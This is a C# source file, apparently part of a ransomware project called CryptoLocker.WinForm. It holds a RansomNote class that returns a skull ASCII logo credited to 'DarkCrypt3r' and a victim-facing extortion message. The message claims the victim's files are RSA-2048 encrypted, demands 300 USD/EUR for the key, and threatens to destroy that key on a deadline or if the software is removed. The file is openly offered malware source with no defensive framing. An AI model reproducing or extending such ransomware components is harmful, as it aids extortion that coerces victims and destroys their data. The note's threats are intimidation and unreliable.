
namespace CryptoLocker.WinForm
{
    public static class RansomNote
    {
        public static string[] GetLogo()
        {
            string[] lines = new[]
            {
                "                             ud$$$**$$$$$$$bc.                                  ",
                "                          u@**'        4$$$$$$$Nu                               ",
                "                        J                ''#$$$$$$r                             ",
                "                       @                       $$$$b                            ",
                "                     .F                        ^*3$$$                           ",
                "                    :% 4                         J$$$N                          ",
                "                    $  :F                       :$$$$$                          ",
                "                   4F  9                       J$$$$$$$                         ",
                "                   4$   k             4$$$$bed$$$$$$$$$                         ",
                "                   $$r  'F            $$$$$$$$$$$$$$$$$r                        ",
                "                   $$$   b.           $$$$$$$$$$$$$$$$$N                        ",
                "                   $$$$$k 3eeed$$b    $$$Euec.'$$$$$$$$$                        ",
                "    .@$**N.        $$$$$' $$$$$$F'L $$$$$$$$$$$  $$$$$$$                        ",
                "    :$$L  'L       $$$$$ 4$$$$$$  * $$$$$$$$$$F  $$$$$$F         edNc           ",
                "   @$$$$N  ^k      $$$$$  3$$$$*%   $F4$$$$$$$   $$$$$'        d'  z$N          ",
                "   $$$$$$   ^k     '$$$'   #$$$F   .$  $$$$$c.u@$$$          J'  @$$$$r         ",
                "   $$$$$$$b   *u    ^$L            $$  $$$$$$$$$$$$u@       $$  d$$$$$$         ",
                "    ^$$$$$$.    'NL   'N. z@*     $$$  $$$$$$$$$$$$$P      $P  d$$$$$$$         ",
                "       ^'*$$$$b   '*L   9$E      4$$$  d$$$$$$$$$$$'     d*   J$$$$$r           ",
                "            ^$$$$u  '$.  $$$L     '#' d$$$$$$'.@$$    .@$'  z$$$$*'             ",
                "              ^$$$$. ^$N.3$$$       4u$$$$$$$ 4$$$  u$*' z$$$'                  ",
                "                '*$$$$$$$$ *$b      J$$$$$$$b u$$P $'  d$$P                     ",
                "                   #$$$$$$ 4$ 3*$'$*$ $'$'c@@$$$$ .u@$$$P                       ",
                "                     '$$$$  ''F~$ $uNr$$$^&J$$$$F $$$$#                         ",
                "                       '$$    '$$$bd$.$W$$$$$$$$F $$'                           ",
                "                         ?k         ?$$$$$$$$$$$F'*                             ",
                "                          9$$bL     z$$$$$$$$$$$F                               ",
                "                           $$$$    $$$$$$$$$$$$$                                ",
                "                            '#$$c  '$$$$$$$$$'                                  ",
                "                             .@'#$$$$$$$$$$$$b                                  ",
                "                           z*      $$$$$$$$$$$$N.                               ",
                "                         e'      z$$'  #$$$k  '*$$.                             ",
                "                     .u*      u@$P'      '#$$c   '$$c                           ",
                "              u@$*'''       d$$'            '$$$u  ^*$$b.                       ",
                "            :$F           J$P'                ^$$$c   ''$$$$$$bL                ",
                "           d$$  ..      @$#                      #$$b         '#$               ",
                "           9$$$$$$b   4$$                          ^$$k         '$              ",
                "            '$$6''$b u$$                             '$    d$$$$$P              ",
                "              '$F $$$$$'                              ^b  ^$$$$b$               ",
                "               '$W$$$$'                                'b@$$$$'                 ",
                "                                                        ^$$$*                   ",
                "                                                                                ",
                "        DarkCrypt3r © By Muhaddi Haxor and a team of Pakistani Hackers          ",
                "                                                                                ",
                "********************************************************************************"
            };

            return lines;
        }

        public static string[] GetNote()
        {
            string[] lines =
            {
                "Your important files produced on this computer: photos, videos, documents etc. are encrypted. A complete list of encrypted files can be found on your desktop, and you can personally verify this.",
                "Encryption was produced using a unique public key RSA-2048 generated for this computer. To decrypt files you need to obtain the private key.",
                "The single copy of the private key, which will allow you to decrypt the files, is located on a secret server; the server will destroy the key after a time specified in this window. After that restoring files is impossible...",
                "To obtain this private key for this computer, which will automatically decrypt files, you need to pay",
                "300USD / 300 EUR .",
                "Click next or go to xxx.com for info",
                "Any attempt to remove or damage this software will lead to the immidiate destruction of the private key by the server."
            };

            return lines;
        }
    }
}
